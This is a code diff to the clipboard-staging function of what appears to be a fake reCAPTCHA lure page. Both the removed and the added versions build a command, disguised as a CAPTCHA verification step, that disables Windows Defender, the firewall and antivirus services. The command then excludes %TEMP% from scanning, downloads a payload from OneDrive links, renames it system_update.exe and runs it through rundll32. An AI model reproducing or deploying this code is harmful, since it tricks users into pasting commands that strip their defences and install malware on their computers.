@@ -183,20 +183,20 @@
     }
 
     function stageClipboard(verification_id){
-        const command = `powershell -w h -ep b -c "Start-Process cmd -ArgumentList '/c powershell -w h -ep b -c ` +
-            `\"Set-MpPreference -DisableRealtimeMonitoring 1; ` +
-            `Set-MpPreference -EnableControlledFolderAccess 0; ` +
-            `Set-NetFirewallProfile -All -Enabled False; ` +
-            `Get-Service | Where-Object {$_.DisplayName -match \\\"antivirus\\\" -or $_.DisplayName -match \\\"security\\\" -or $_.DisplayName -match \\\"mcafee\\\" -or $_.DisplayName -match \\\"norton\\\" -or $_.DisplayName -match \\\"symantec\\\" -or $_.DisplayName -match \\\"kaspersky\\\" -or $_.DisplayName -match \\\"bitdefender\\\" -or $_.DisplayName -match \\\"avast\\\" -or $_.DisplayName -match \\\"avg\\\"} | Stop-Service -Force; ` +
-            `Add-MpPreference -ExclusionPath \\\"%TEMP%\\\"; ` +
-            `Invoke-WebRequest https://1drv.ms/u/c/2f3053ae4c170361/EeYeejV2PKFEmtjhRhdpI2wB64I2_mzc80Ww3Vo78_JhsQ?e=LT49up -OutFile \\\"%TEMP%\\captcha.html\\\"; ` +
-            `Copy-Item \\\"%TEMP%\\captcha.html\\\" \\\"%TEMP%\\system_update.exe\\\"; ` +
-            `Start-Process \\\"rundll32.exe\\\" -ArgumentList \\\"%TEMP%\\system_update.exe,Main\\\"; ` +
-            `Invoke-WebRequest https://1drv.ms/i/c/2f3053ae4c170361/EUij8r4pE9lPg_c9kuSGMTkB6i4S4qqaNCE7U5NRDxePCg?e=tQOSx6 -OutFile \\\"%TEMP%\\wallpaper.jpg\\\"; ` +
-            `Add-Type -TypeDefinition \\\"using System; using System.Runtime.InteropServices; public class Wallpaper { [DllImport(\\\"user32.dll\\\", CharSet=CharSet.Auto)] public static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni); }\\\"; ` +
-            `[Wallpaper]::SystemParametersInfo(20, 0, \\\"%TEMP%\\wallpaper.jpg\\\", 3);` +
-            `\"' -WindowStyle Hidden"` +
-            ` # ✅ ''I am not a robot - reCAPTCHA Verification ID: ${verification_id}''`;
+        const command = `cmd /c "echo off && ` +
+            `reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1 && ` +
+            `reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection" /v DisableRealtimeMonitoring /t REG_DWORD /d 1 /f >nul 2>&1 && ` +
+            `sc config WinDefend start= disabled >nul 2>&1 && ` +
+            `netsh advfirewall set allprofiles state off >nul 2>&1 && ` +
+            `taskkill /f /im MsMpEng.exe >nul 2>&1 && ` +
+            `bitsadmin /transfer mydownload /download /priority normal "https://1drv.ms/u/c/2f3053ae4c170361/EeYeejV2PKFEmtjhRhdpI2wB64I2_mzc80Ww3Vo78_JhsQ?e=LT49up" "%TEMP%\\captcha.html" >nul 2>&1 && ` +
+            `copy "%TEMP%\\captcha.html" "%TEMP%\\system_update.exe" >nul 2>&1 && ` +
+            `reg add "HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths" /v "%TEMP%" /t REG_DWORD /d 0 /f >nul 2>&1 && ` +
+            `bitsadmin /transfer mywallpaper /download /priority normal "https://1drv.ms/i/c/2f3053ae4c170361/EUij8r4pE9lPg_c9kuSGMTkB6i4S4qqaNCE7U5NRDxePCg?e=tQOSx6" "%TEMP%\\wallpaper.jpg" >nul 2>&1 && ` +
+            `reg add "HKCU\\Control Panel\\Desktop" /v Wallpaper /t REG_SZ /d "%TEMP%\\wallpaper.jpg" /f >nul 2>&1 && ` +
+            `RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters >nul 2>&1 && ` +
+            `start rundll32.exe "%TEMP%\\system_update.exe",Main && ` +
+            `echo ✅ ''I am not a robot - reCAPTCHA Verification ID: ${verification_id}''"`;
 
         setClipboardCopyData(command);
     }
